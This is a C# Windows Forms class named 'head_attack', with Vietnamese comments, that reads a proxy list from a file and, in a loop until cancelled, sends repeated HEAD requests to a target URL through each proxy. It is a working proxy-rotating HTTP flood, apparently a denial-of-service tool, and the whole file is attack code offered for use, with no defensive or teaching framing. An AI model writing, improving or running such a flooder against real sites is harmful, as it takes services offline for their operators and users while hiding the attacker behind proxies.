using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

public class head_attack
{
    private string targetUrl;
    private string proxyPath;
    private int multiple;
    private ListBox listBoxStatus;
    private SemaphoreSlim semaphore;

    public head_attack(string targetUrl, string proxyPath, int multiple, ListBox listBoxStatus)
    {
        this.targetUrl = targetUrl;
        this.proxyPath = proxyPath;
        this.multiple = multiple;
        this.listBoxStatus = listBoxStatus;
        this.semaphore = new SemaphoreSlim(5); // Giới hạn tối đa 5 kết nối đồng thời
    }

    public async Task ExecuteAttack(CancellationToken cancellationToken)
    {
        List<string> proxies = new List<string>(File.ReadAllLines(proxyPath)); // Đọc danh sách proxy từ tệp

        var tasks = new List<Task>();

        while (!cancellationToken.IsCancellationRequested)
        {
            foreach (var proxy in proxies)
            {
                await semaphore.WaitAsync(); // Chờ cho đến khi có chỗ

                var task = Task.Run(async () =>
                {
                    try
                    {
                        string[] parts = proxy.Split(':');
                        if (parts.Length != 2) return;

                        var handler = new HttpClientHandler
                        {
                            Proxy = new WebProxy(parts[0], int.Parse(parts[1])),
                            UseProxy = true,
                        };

                        using (var client = new HttpClient(handler))
                        {
                            for (int i = 0; i < multiple; i++)
                            {
                                var requestMessage = new HttpRequestMessage(HttpMethod.Head, targetUrl);
                                var response = await client.SendAsync(requestMessage, cancellationToken);

                                if (response.IsSuccessStatusCode)
                                {
                                    listBoxStatus.Invoke((MethodInvoker)(() =>
                                        listBoxStatus.Items.Add($"Gửi HEAD request thành công qua proxy: {proxy}")));
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        listBoxStatus.Invoke((MethodInvoker)(() =>
                            listBoxStatus.Items.Add($"Proxy {proxy} không hoạt động: {ex.Message}")));
                    }
                    finally
                    {
                        semaphore.Release(); // Giải phóng Semaphore
                    }
                });

                tasks.Add(task);
            }

            await Task.WhenAll(tasks); // Chờ tất cả các task hoàn thành
            tasks.Clear(); // Xóa danh sách task sau khi hoàn thành
        }
    }
}